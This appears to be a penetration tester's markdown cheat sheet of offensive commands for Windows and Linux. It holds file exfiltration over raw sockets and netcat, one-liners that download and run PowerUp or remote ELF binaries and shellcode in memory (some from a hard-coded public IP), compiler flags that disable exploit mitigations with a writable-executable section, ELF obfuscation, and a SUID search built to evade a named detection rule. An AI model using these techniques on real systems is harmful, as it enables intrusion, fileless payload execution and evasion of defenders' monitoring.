# Pentesting Blog
https://web.archive.org/web/20221126165225/https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#enumeration

# Recon - Grep network packets
```bash
sudo ngrep -i -d <network interface> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -U '%' -N -L \\\\10.10.10.10\\
```

# Windows Notes

## Transfer file via PowerShell to Linux
```ps
$serverPort = 5555
$serverIp = "10.10.10.103"
$fileToSend = "test.txt"
$fileBytes = [System.IO.File]::ReadAllBytes($fileToSend)
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($serverIp, $serverPort)
$stream = $client.GetStream()
$stream.Write($fileBytes, 0, $fileBytes.Length)
$stream.Close()
$client.Close()
```

```bash
# Linux listener
nc -l -p 5555 > test.txt
```

## Run PowerUp in memory without saving to disk, call Invoke-AllChecks at end of script

### CMD
```cmd
echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/PowerUp.ps1') | powershell -noprofile -
```

### PowerShell
```ps
wget('http://10.10.10.10/PowerUp.ps1') -UseBasicParsing|iex
```

## If a SMB share you have access to, download it, and extract it
```bash
smbclient \\\\10.10.10.10\\share -p <Port> -N -Tc share.tar; tar xf share.tar -C share
```

## Compile cl.exe
```cmd
cl.exe /nologo /MT /Ox /W0 /GS- /EHs- /GR- /DNDEBUG /Tp auth_validator.cpp /link /DYNAMICBASE:NO /NXCOMPAT:NO /OUT:auth_validator.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 /ENTRY:WinMain /NODEFAULTLIB /MERGE:.rdata=.text /MERGE:.pdata=.text /MERGE:.data=.text Ws2_32.lib user32.lib ucrt.lib libcmt.lib shlwapi.lib
```

## Expand crt heap to 1MB - calls NtAllocateVirtualMemory
```cmd
cl.exe /nologo /MT /Ox /W0 /GS- /DNDEBUG /Tc no_library.c /link kernel32.lib /OUT:no_library.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 /ENTRY:WinMain /NODEFAULTLIB /HEAP:0x100000,0x100000
```

## Add rwx code segment - calls NtCreateSection and NtMapViewOfSection
```c
#pragma section(".code", execute, read, write)
#pragma comment(linker,"/SECTION:.code,ERW")
__declspec(allocate(".code")) unsigned char allocatedBuffer[1024];
```

## Allocate buffer to data segment - calls NtCreateSection and NtMapViewOfSection
```c
#pragma section(".data", read, write)
__declspec(allocate(".data")) unsigned char allocatedBuffer[1024];
```

## Compile syscalls masm
```cmd
ml64 /c syscalls.asm /Fo syscalls.obj
```

## Compile csc.exe
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /optimize+ /debug- .\data_recovery.cs
```

## Compile roslyn compiler
```ps
& "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\Roslyn\csc.exe" /optimize+ /unsafe /debug- .\program.cs .\Structs.cs
```

## dotnet publish application
```cmd
dotnet publish -c Release -r win-x64 --self-contained /p:PublishSingleFile=true /p:PublishTrimmed=true /p:EnableCompressionInSingleFile=true
```

## Converts COM type libraries into .NET assemblies
```cmd
tlbimp C:\Windows\System32\wsmauto.dll /out:WSManAutomation.dll
```

## Add reference to project
```cmd
dotnet add reference WSManAutomation.dll
```

## Windows - only GetProcAddress 
```cpp
template <typename T>
class vector {
private:
    T* data;
    size_t capacity;
    size_t size;
    pMalloc mallocFn;
    pFree freeFn;

public:
    vector(size_t initialSize, pMalloc m, pFree f)
        : capacity(initialSize), size(0), mallocFn(m), freeFn(f) {
        data = (T*)mallocFn(sizeof(T) * capacity);
    }

    ~vector() {
        freeFn(data);
    }

    size_t Size() const { return size; }

    T& operator[](size_t index) { return data[index]; }

    void push_back(const T& value) {
        if (size >= capacity) {
            capacity = capacity == 0 ? 1 : capacity * 2;
            T* newData = (T*)mallocFn(sizeof(T) * capacity);
            for (size_t i = 0; i < size; ++i) {
                newData[i] = data[i];
            }
            freeFn(data);
            data = newData;
        }
        data[size++] = value;
    }
};

void Sort(vector<int>& arr) {
    int n = arr.Size();
    for (int i = 0; i < n - 1; i++) {
        for (int j = 0; j < n - i - 1; j++) {
            if (arr[j] > arr[j + 1]) {
                int temp = arr[j];
                arr[j] = arr[j + 1];
                arr[j + 1] = temp;
            }
        }
    }
}
```

## Windows page-align malloc
```c
#define CHUNK (56 * 1024)
#define MAX_CHUNKS 5
#define PAGE_SIZE 4096
DWORD totalSize = 0, bytesRead = 0;
DWORD maxSize = MAX_CHUNKS * CHUNK;
void* tempBuffer = mallocFunc(maxSize);
if (!tempBuffer) {
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return -1;
}

while (totalSize < maxSize) {
    if (!InternetReadFile(hFile, (BYTE*)tempBuffer + totalSize, CHUNK, &bytesRead) || bytesRead == 0) {
        break;
    }
    totalSize += bytesRead;
}

InternetCloseHandle(hFile);
InternetCloseHandle(hInternet);

if (totalSize == 0) {
    MessageBoxA(NULL, "No data downloaded", "Error", MB_OK);
    freeFunc(tempBuffer);
    return -1;
}

size_t roundedSize = (totalSize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
void* raw = mallocFunc(roundedSize + PAGE_SIZE);
if (!raw) {
    MessageBoxA(NULL, "Failed to allocate raw buffer", "Error", MB_OK);
    freeFunc(tempBuffer);
    return -1;
}

void* execBuffer = (void*)(((uintptr_t)raw + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1));
memcpy(execBuffer, tempBuffer, totalSize);
freeFunc(tempBuffer);
```

# Linux Notes

## Obfuscate ELF
https://github.com/Trigleos/ELFREVGO.git
```bash
ELFREVGO/bin/ELFREVGO -f test -e -t -n -gd execve -gf custom_logger -o testx
```

## Netcat Transfer folder Linux to Linux
```bash
nc -l -p 1234 | tar xf -
tar cf - /home/debian | nc 10.10.10.10 1234
```

## Unique way to enumerate SUID binaries, evades this rule
https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_suid_sguid_enumeration.toml
```bash
find / -type f 2>/dev/null -exec stat -c "%A %n" {} + | grep '^...s'
```

## Python3 run ELF in memory with no parameters
```bash
python3.7 -c 'import os, urllib.request; d=urllib.request.urlopen("http://10.10.0.103/test.exe"); fd=os.memfd_create("foo"); os.write(fd,d.read()); p=f"/proc/self/fd/{fd}"; os.execve(p, [p], {})'
```

## Python3 run ELF in memory with parameters
```bash
python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("foo"); os.write(fd, d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p,"-Pn", "-n", "127.0.0.1"], {})'
```

## Python2 map and execute shellcode in memory
```bash
/usr/bin/python -c 'import urllib2,mmap,ctypes;d=urllib2.urlopen("http://8.209.128.8/a").read();m=mmap.mmap(-1,len(d),34,7);m.write(d);ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()'
```

## Python2 - Write ELF as temp file and execute
```bash
/usr/bin/python -c 'import os,urllib2,tempfile;d=urllib2.urlopen("http://8.209.128.8/config").read();f=tempfile.NamedTemporaryFile(delete=False);f.write(d);f.close();os.chmod(f.name,0755);os.execve(f.name,[f.name,"-pthread"],{})'
```

# FreeBSD - Cross-Compile
```bash
clang --target=x86_64-unknown-freebsd12.2 --sysroot=/root/cross_compiler/freebsd-12.2-sysroot -I/root/cross_compiler/freebsd-12.2-sysroot/usr/include -L/root/cross_compiler/freebsd-12.2-sysroot/usr/lib -o shell shell.c -fPIC
```
